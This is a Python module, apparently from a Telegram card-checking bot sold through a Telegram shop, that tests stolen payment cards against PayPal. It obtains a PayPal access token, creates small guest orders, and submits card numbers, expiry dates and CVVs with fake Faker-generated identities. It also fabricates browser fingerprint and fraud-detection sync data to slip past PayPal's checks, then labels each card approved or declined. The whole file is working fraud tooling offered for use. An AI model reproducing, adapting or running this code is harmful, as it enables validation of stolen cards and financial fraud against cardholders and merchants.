# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
import asyncio, aiohttp, json, random
from faker import Faker
from Commands.Gates._template import run_gate

_GATEWAY = 'PayPal AVS'
_f = Faker('en_US')

_num      = lambda: ''.join(str(random.randint(0,9)) for _ in range(10))
_postcode = lambda: ''.join(str(random.randint(0,9)) for _ in range(5))
_name     = lambda: (
    _f.first_name().replace(' ','').replace('.',''),
    _f.last_name()
)
_email    = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com','gmail.com','yahoo.com','outlook.com'])}"


def _gen_rb(f='3ND6389816212463X', s='INLINE_GUEST'):
    import time as _t
    t  = int(_t.time() * 1000)
    sh = lambda sv: sum(map(ord, sv)) & 0xFFFFFFFF
    rdt = lambda: ''.join(f"{random.randint(10000,60000)},{random.randint(10000,60000)},{random.randint(8000,30000)}:"
                          for _ in range(random.randint(8,14))) + str(sh('...')) + f",{random.randint(40,80)}"
    ts  = lambda n: ''.join(f"Di{i}:{random.randint(30,15000)}Ui{i}:{random.randint(20,120)}"
                            for i in range(n)) + f"Uh:{sh('...')}"
    return json.dumps({
        'SC_VERSION': '2.0.4', 'syncStatus': 'data', 'f': f, 's': s,
        'chk': {'ts': t, 'eteid': [random.randint(-2147483648,2147483647) for _ in range(8)],
                'tts': random.randint(200,800)},
        'dc': '{"screen":{"colorDepth":24,"pixelDepth":24,"height":1080,"width":1920,'
              '"availHeight":1080,"availWidth":1920},'
              '"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"}',
        'wv': False, 'web_integration_type': 'IFRAME', 'cookie_enabled': True,
        'd': {'ts1': ts(7), 'ts2': ts(4), 'rDT': rdt()},
    }, separators=(',', ':'))


def _bt(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return 'None'


_SMART_URL = (
    'https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect'
    '&style.tagline=false&allowBillingPayments=true&applePaySupport=false'
    '&buttonSessionID=uid_43ff635940_mdy6nte6mza&clientID=AXGz3gL7tUsVopYLol7Js1cInn3msFCBjNlxwQEvk5pFGGOksCRTCgXqlsZi1mt69QNnrXhDSvdQw86P'
    '&clientMetadataID=uid_0c5caea5ce_mdy6mzi6mjg&commit=true&components.0=buttons&currency=MXN'
    '&debug=false&disableSetCookie=true&env=production&flow=purchase'
    '&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9fQ'
    '&intent=capture&locale.country=MX&locale.lang=es&platform=mobile'
    '&renderedButtons.0=paypal&renderedButtons.1=card'
    '&sessionID=uid_0c5caea5ce_mdy6mzi6mjg&sdkCorrelationID=prebuild'
    '&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcyJ9'
    '&sdkVersion=5.0.560&storageID=uid_5986cd21d9_mdy6mzi6mjg'
    '&supportedNativeBrowser=true&supportsPopups=true&vault=false'
    '&userAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
)

_HS_BASE = {
    'Host': 'www.paypal.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Sec-GPC': '1', 'Accept-Language': 'es-MX,es;q=0.7',
    'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Dest': 'iframe',
}

_VALID = ['is3DSecureRequired', 'OTP', 'INVALID_SECURITY_CODE',
          'EXISTING_ACCOUNT_RESTRICTED', 'INVALID_BILLING_ADDRES']


async def _async_flow(num, mes, ano, cvv):
    async with aiohttp.ClientSession() as sess:
        hs = dict(_HS_BASE)
        async with sess.get(_SMART_URL, headers=hs) as r1:
            r1t = await r1.text()
            fT  = _bt(r1t, '"facilitatorAccessToken":"', '",')
            if fT == 'None':
                return {'status': False, 'raise': 'No PayPal facilitator token'}

        hs['authorization'] = f'Bearer {fT}'
        hs['content-type']  = 'application/json'
        fs, ls = _name()
        m = _email()
        n = f"{fs} {ls}"
        data = {'intent': 'CAPTURE',
                'purchase_units': [{'description': 'Payment', 'amount': {'value': 0.1, 'currency_code': 'USD'}}],
                'payer': {'email_address': m, 'name': {'name': n},
                          'address': {'address_line_1': None, 'address_line_2': None,
                                      'postal_code': None, 'country_code': 'MX'}},
                'application_context': {'shipping_preference': 'NO_SHIPPING'}}
        async with sess.post('https://www.paypal.com/v2/checkout/orders', headers=hs, json=data) as r2:
            r2j   = await r2.json()
            order = r2j.get('id')
            if not order:
                return {'status': False, 'raise': 'No PayPal order ID'}

        async with sess.get(
            f'https://www.paypal.com/smart/card-fields?token={order}'
            '&sessionID=uid_0c5caea5ce_mdy6mzi6mjg&buttonSessionID=uid_43ff635940_mdy6nte6mza'
            '&locale.x=es_MX&commit=true&env=production&country.x=MX&disable-card=',
            headers=hs
        ) as r3:
            r3t  = await r3.text()
            inTk = _bt(r3t, '"integrityToken":"', '"')

        gql_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n            $integrityToken: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n                integrityToken: $integrityToken\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order,
                'card': {'cardNumber': num, 'type': 'MASTER_CARD',
                         'expirationDate': f'{mes}/{ano}',
                         'postalCode': _postcode(), 'securityCode': cvv},
                'phoneNumber': _num(), 'firstName': fs.strip(), 'lastName': ls.strip(),
                'billingAddress': {'givenName': fs.strip(), 'familyName': ls.strip(),
                                   'line1': None, 'line2': None, 'city': None, 'state': None,
                                   'postalCode': _postcode(), 'country': 'MX'},
                'email': m, 'currencyConversionType': 'PAYPAL',
                'integrityToken': inTk,
            },
            'operationName': 'payWithCard',
            'fn_sync_data': _gen_rb(f=order),
        }
        async with sess.post('https://www.paypal.com/graphql?paywithcard', headers=hs, json=gql_data) as r4:
            r4t = await r4.text()
            r4j = await r4.json()
            hit = next((v for v in _VALID if v in r4t), None)
            if hit:
                return {'status': True, 'success': True, 'response': f'Approved ✅ | {hit}'}
            elif 'CARD_GENERIC_ERROR' in r4t:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | CARD_GENERIC_ERROR'}
            elif '"errors":' in r4t:
                msg = r4j.get('errors', [{}])[0].get('message', 'Unknown error')
                return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg[:120]}'}
            else:
                return {'status': True, 'success': True, 'response': 'Approved ✅ | Thanks for your payment'}


def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = '20' + ano if len(ano) == 2 else ano
    return asyncio.run(_async_flow(num, mes, ano, cvv))


def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def gateCmd(bot, update, gestion):
    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_checker)


def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌',
            'response': r.get('response', '')}

# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
